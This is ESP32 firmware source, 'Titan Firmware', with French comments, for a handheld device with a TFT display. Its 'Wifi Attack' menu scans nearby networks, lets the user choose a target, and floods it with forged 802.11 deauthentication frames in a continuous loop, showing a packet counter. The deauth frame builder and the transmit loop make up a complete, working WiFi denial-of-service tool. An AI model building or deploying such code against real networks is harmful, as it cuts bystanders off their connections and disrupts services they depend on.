#include <TFT_eSPI.h>    // Bibliothèque pour l'écran TFT
#include <WiFi.h>         // Bibliothèque pour la gestion du WiFi
#include <FS.h>           // Bibliothèque pour l'accès au système de fichiers SPIFFS
#include <SD.h>           // Bibliothèque pour l'accès à la carte SD
#include <esp_adc_cal.h>  // Bibliothèque pour la calibration de l'ADC
#include "esp_wifi.h"     // Pour la transmission de paquets 802.11
#include "titan.h"        // Inclusion du header contenant l'image (titan)

// ----------------------
// Définition des GPIO et constantes
// ----------------------
#define BACKLIGHT_PIN 15
#define BUTTON_A      0
#define BUTTON_B      14
#define PIN_BAT_VOLT  4

// Version du firmware
const char* firmware_version = "1.1.1";

// Menu principal
const char* menu_items[] = {"Wifi Attack", "BLE Attack", "Info", "Settings", "Battery Info"};
const int menu_size = sizeof(menu_items) / sizeof(menu_items[0]);
int current_menu_index = 0;

// Couleurs utilisées
const uint16_t COLOR_RED    = TFT_eSPI().color565(255, 0, 0);
const uint16_t COLOR_WHITE  = TFT_WHITE;
const uint16_t COLOR_ORANGE = TFT_eSPI().color565(255, 165, 0);
const uint16_t COLOR_VIOLET = TFT_eSPI().color565(138, 43, 226);
const uint16_t COLOR_BLUE   = TFT_eSPI().color565(0, 0, 255);
const uint16_t COLOR_BLACK  = TFT_BLACK;

uint16_t main_color = COLOR_VIOLET;  // Couleur principale par défaut
int brightness = 255;                // Luminosité par défaut (maximale)

// Etats des boutons
bool buttonA_pressed = false;
bool buttonB_pressed = false;

// Instance de l'écran TFT
TFT_eSPI tft = TFT_eSPI();

// ----------------------
// Splash Screen (écran de démarrage)
// ----------------------
void showSplashScreen() {
  tft.fillScreen(COLOR_BLACK);
  int imgWidth = 170;
  int imgHeight = 170;
  int x = (tft.width() - imgWidth) / 2;
  int y = (tft.height() - imgHeight) / 2;
  tft.pushImage(x, y, imgWidth, imgHeight, titan);
  delay(5000); // Affiche pendant 5 secondes
}

// ----------------------
// Fonctions utilitaires pour les boutons
// ----------------------
void waitForButtonPress(int pin) {
  while (digitalRead(pin) == HIGH) {
    delay(50);
  }
  delay(200); // Anti-rebond
}

bool isButtonPressed(int pin, bool &buttonState) {
  if (digitalRead(pin) == LOW && !buttonState) {
    buttonState = true;
    delay(200);  // Anti-rebond
    return true;
  }
  if (digitalRead(pin) == HIGH && buttonState) {
    buttonState = false;
  }
  return false;
}

// ----------------------
// Affichage du menu principal
// ----------------------
void displayMenu() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(3);
  tft.setTextDatum(MC_DATUM);
  tft.drawString(menu_items[current_menu_index], tft.width() / 2, tft.height() / 2);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Titan Firmware", 5, 5);

  tft.setTextDatum(TR_DATUM);
  tft.drawString(firmware_version, tft.width() - 5, 5);

  String categoryText = "Category: " + String(current_menu_index + 1) + "/" + String(menu_size);
  tft.setTextDatum(BR_DATUM);
  tft.drawString(categoryText, tft.width() - 5, tft.height() - 5);
}

// ----------------------
// Partie améliorée : Deauthentication (attaque Wifi)
// ----------------------

// Constantes pour la trame de deauthentication
const int DEAUTH_FRAME_SIZE = 26;
const uint8_t FRAME_CONTROL_DEAUTH[2] = {0xC0, 0x00}; // Frame Control : deauth
const uint8_t DURATION[2] = {0x00, 0x00};             // Durée
const uint8_t SEQUENCE[2] = {0x00, 0x00};             // Numéro de séquence
const uint8_t REASON_CODE[2] = {0x07, 0x00};          // Raison : Classe 3 frame reçue d'une STA non associée
const uint8_t BROADCAST_ADDR[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

// Fonction pour construire le paquet de deauthentication
void buildDeauthFrame(const uint8_t *bssid, uint8_t *frameBuffer) {
  int index = 0;
  memcpy(frameBuffer + index, FRAME_CONTROL_DEAUTH, sizeof(FRAME_CONTROL_DEAUTH));
  index += sizeof(FRAME_CONTROL_DEAUTH);
  memcpy(frameBuffer + index, DURATION, sizeof(DURATION));
  index += sizeof(DURATION);
  memcpy(frameBuffer + index, BROADCAST_ADDR, sizeof(BROADCAST_ADDR));
  index += sizeof(BROADCAST_ADDR);
  memcpy(frameBuffer + index, bssid, 6);
  index += 6;
  memcpy(frameBuffer + index, bssid, 6);
  index += 6;
  memcpy(frameBuffer + index, SEQUENCE, sizeof(SEQUENCE));
  index += sizeof(SEQUENCE);
  memcpy(frameBuffer + index, REASON_CODE, sizeof(REASON_CODE));
}

// ----------------------
// Attaque continue améliorée : envoi de paquets en boucle avec compteur
// ----------------------
void continuousDeauthAttack(const uint8_t *bssid, int channel) {
  if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println("Erreur lors du réglage du canal WiFi");
    return;
  }

  uint8_t deauthFrame[DEAUTH_FRAME_SIZE];
  buildDeauthFrame(bssid, deauthFrame);

  // Préparation de l'affichage de l'attaque
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Attaque en cours", tft.width() / 2, 20);
  tft.setTextSize(1);
  tft.drawString("A: Stop", tft.width() / 2, tft.height() - 20);

  uint32_t packetCount = 0;
  char buf[20];

  // Boucle d'attaque continue jusqu'à ce que le bouton A soit pressé
  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    // Envoyer un groupe de paquets
    for (int i = 0; i < 20; i++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, DEAUTH_FRAME_SIZE, false);
      packetCount++;
      delay(10);
    }
    // Mise à jour du compteur d'envoi dans une zone dédiée (pour limiter le scintillement)
    tft.fillRect(0, 40, tft.width(), 20, COLOR_BLACK);
    sprintf(buf, "Packets: %lu", packetCount);
    tft.setTextColor(main_color, COLOR_BLACK);
    tft.setTextDatum(TC_DATUM);
    tft.drawString(buf, tft.width()/2, 50);
    delay(50);
  }
  Serial.println("Arrêt de l'attaque");
  delay(500); // Anti-rebond
}

// ----------------------
// Affichage de la catégorie Wifi Attack avec sélection du réseau
// ----------------------
void displayWifiAttack() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Wifi Attack", tft.width() / 2, 20);
  
  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Scanning networks...", 10, 50);
  
  int n = WiFi.scanNetworks();
  delay(500);  // Attendre la fin du scan

  if (n == 0) {
    tft.fillScreen(COLOR_BLACK);
    tft.drawString("Aucun réseau trouve", 10, 70);
    waitForButtonPress(BUTTON_A);
    displayMenu();
    return;
  }

  int targetIndex = 0;
  bool selectionDone = false;
  const int pageSize = 5;  // Nombre d'éléments affichés par page
  int pageStart = 0;
  
  // Zone d'affichage réservée à la liste (pour réduire le scintillement)
  int listY = 40;
  int listH = pageSize * 20;

  // Boucle de sélection du réseau
  while (!selectionDone) {
    // Affichage de l'en-tête (on ne touche pas à la zone de liste)
    tft.fillRect(0, 0, tft.width(), listY, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Select Network", tft.width() / 2, 10);
    
    // Calcul de la page à afficher pour centrer la sélection
    pageStart = targetIndex - pageSize / 2;
    if (pageStart < 0) pageStart = 0;
    if (pageStart + pageSize > n) pageStart = n - pageSize;
    if (pageStart < 0) pageStart = 0;

    // Effacer uniquement la zone de liste
    tft.fillRect(0, listY, tft.width(), listH, COLOR_BLACK);
    
    // Affichage de la liste des réseaux pour la page
    for (int i = pageStart; i < pageStart + pageSize && i < n; i++) {
      int yPos = listY + (i - pageStart) * 20;
      String ssid = WiFi.SSID(i);
      // Tronquer le SSID s'il est trop long
      if (ssid.length() > 20) {
        ssid = ssid.substring(0, 20) + "...";
      }
      String info = String(i + 1) + ": " + ssid + " (Ch:" + String(WiFi.channel(i)) + ")";
      
      // Mise en surbrillance de l'élément sélectionné
      if (i == targetIndex) {
        tft.fillRect(5, yPos - 2, tft.width() - 10, 18, main_color);
        tft.setTextColor(COLOR_BLACK, main_color);
      } else {
        tft.setTextColor(main_color, COLOR_BLACK);
      }
      tft.setTextSize(1);
      tft.setTextDatum(TL_DATUM);
      tft.drawString(info, 10, yPos);
    }
    
    // Instructions en bas de l'écran
    tft.fillRect(0, tft.height() - 20, tft.width(), 20, COLOR_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("B: Suivant | A: Choisir", tft.width()/2, tft.height()-15);

    // Gestion des boutons
    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      targetIndex = (targetIndex + 1) % n;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }

  // Confirmation du réseau sélectionné
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Cible:", tft.width() / 2, 30);
  tft.drawString(WiFi.SSID(targetIndex), tft.width() / 2, 60);
  delay(2000);

  uint8_t* bssid = WiFi.BSSID(targetIndex);
  int channel = WiFi.channel(targetIndex);

  // Lancer l'attaque continue améliorée
  continuousDeauthAttack(bssid, channel);

  displayMenu();
}

// ----------------------
// Affichage des informations système
// ----------------------
void displayInfo() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Information", tft.width() / 2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  const char* infos[] = {
    "Chip: ESP32-S3",
    "Screen: 170x320",
    "Flash: 16MB",
    "PSRAM: 8MB",
    "Battery: N/A"
  };
  for (int i = 0; i < 5; i++) {
    tft.drawString(infos[i], 10, 50 + i * 20);
  }
  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// ----------------------
// Affichage des informations sur la batterie
// ----------------------
void displayBatteryInfo() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_value_t val_type = esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Battery Info", tft.width() / 2, 20);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  if (voltage > 4300) {
    tft.drawString("No battery connected!", 10, 50);
  } else {
    tft.drawString("Voltage: " + String(voltage) + " mV", 10, 50);
  }
  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// ----------------------
// Affichage des paramètres
// ----------------------
void displaySettings() {
  const char* colors[] = {"Red", "White", "Orange", "Violet", "Blue"};
  uint16_t color_values[] = {COLOR_RED, COLOR_WHITE, COLOR_ORANGE, COLOR_VIOLET, COLOR_BLUE};
  int color_index = 0;
  while (true) {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(main_color, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Settings", tft.width() / 2, 20);

    tft.setTextSize(2);
    tft.drawString("Main color:", tft.width() / 2, tft.height() / 2 - 30);
    tft.setTextSize(3);
    tft.drawString(colors[color_index], tft.width() / 2, tft.height() / 2);

    tft.setTextSize(2);
    tft.drawString("Brightness: " + String(brightness), tft.width() / 2, tft.height() / 2 + 50);

    // Modification de la luminosité avec le bouton A
    if (digitalRead(BUTTON_A) == LOW) {
      brightness += 20;
      if (brightness > 255) brightness = 20;
      analogWrite(BACKLIGHT_PIN, brightness);
      delay(200);
    }
    // Changement de couleur ou sortie (pression longue sur le bouton B)
    if (digitalRead(BUTTON_B) == LOW) {
      unsigned long press_time = millis();
      while (digitalRead(BUTTON_B) == LOW) {
        if (millis() - press_time > 1000) {
          displayMenu();
          return;
        }
      }
      color_index = (color_index + 1) % 5;
      main_color = color_values[color_index];
      delay(200);
    }
    delay(100);
  }
}

// ----------------------
// Sélection d'une catégorie dans le menu
// ----------------------
void enterCategory() {
  if (strcmp(menu_items[current_menu_index], "Wifi Attack") == 0) {
    displayWifiAttack();
  } else if (strcmp(menu_items[current_menu_index], "Info") == 0) {
    displayInfo();
  } else if (strcmp(menu_items[current_menu_index], "Settings") == 0) {
    displaySettings();
  } else if (strcmp(menu_items[current_menu_index], "Battery Info") == 0) {
    displayBatteryInfo();
  } else {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Entering: " + String(menu_items[current_menu_index]), tft.width() / 2, tft.height() / 2);
    delay(1000);
    displayMenu();
  }
}

// ----------------------
// Gestion des boutons dans la boucle principale
// ----------------------
void handleButtonPress() {
  if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
    enterCategory();
  } else if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
    current_menu_index = (current_menu_index + 1) % menu_size;
    displayMenu();
  }
}

// ----------------------
// Fonction setup()
// ----------------------
void setup() {
  Serial.begin(115200);
  pinMode(BACKLIGHT_PIN, OUTPUT);
  digitalWrite(BACKLIGHT_PIN, HIGH);  // Allume le rétroéclairage
  analogWrite(BACKLIGHT_PIN, brightness);
  pinMode(BUTTON_A, INPUT_PULLUP);
  pinMode(BUTTON_B, INPUT_PULLUP);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(COLOR_BLACK);

  // Configuration du WiFi en mode station (pour esp_wifi_80211_tx)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  showSplashScreen();
  displayMenu();
}

// ----------------------
// Boucle principale
// ----------------------
void loop() {
  handleButtonPress();
  delay(50);
}
